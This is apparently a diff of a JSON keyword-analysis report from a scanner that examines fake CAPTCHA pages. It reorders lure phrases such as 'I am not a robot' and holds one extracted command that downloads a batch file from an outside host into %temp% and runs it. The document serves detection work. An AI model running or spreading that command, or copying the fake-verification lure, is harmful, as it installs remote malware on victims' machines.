@@ -88,27 +88,27 @@
     "keyword_analysis": {
       "categories": {
         "Social Engineering": [
+          "CaptchaListeners",
+          "verification ID",
+          "Robot",
+          "robot",
+          "CaptchaLoading",
+          "captcha-iogo",
+          "CaptchaCheckbox",
+          "CAPTCHA Verification",
+          "Verification ID",
           "verification-id",
           "I am not a robot",
-          "captcha-iogo",
-          "Verify you are human",
-          "Robot",
-          "CaptchaCheckbox",
-          "verification",
-          "captcha-container",
-          "CAPTCHA",
-          "CaptchaLoading",
-          "cmd = 'cmd /c start /min cmd.exe /c \"curi -L \"https://pumpfun.exposed/a.cmd\" -o \"%temp%\\\\verification.txt.bat\" && caii \"%temp%\\\\verification.txt.bat\"\"';",
-          "verification_id",
-          "To better prove you are not a robot",
           "Verification",
-          "CAPTCHA Verification",
-          "Checking if you are human",
-          "verification ID",
+          "Verify you are human",
           "Captcha",
-          "robot",
-          "CaptchaListeners",
-          "Verification ID"
+          "cmd = 'cmd /c start /min cmd.exe /c \"curi -L \"https://pumpfun.exposed/a.cmd\" -o \"%temp%\\\\verification.txt.bat\" && caii \"%temp%\\\\verification.txt.bat\"\"';",
+          "CAPTCHA",
+          "captcha-container",
+          "To better prove you are not a robot",
+          "Checking if you are human",
+          "verification",
+          "verification_id"
         ],
         "System Commands": [
           "cmd"
@@ -117,11 +117,11 @@
           "hidden"
         ],
         "Technical Terms": [
-          ".bat",
           "Ray ID",
-          "iex",
           "failed_to_retrieve",
-          ".exe"
+          ".exe",
+          ".bat",
+          "iex"
         ]
       },
       "similar_groups": [
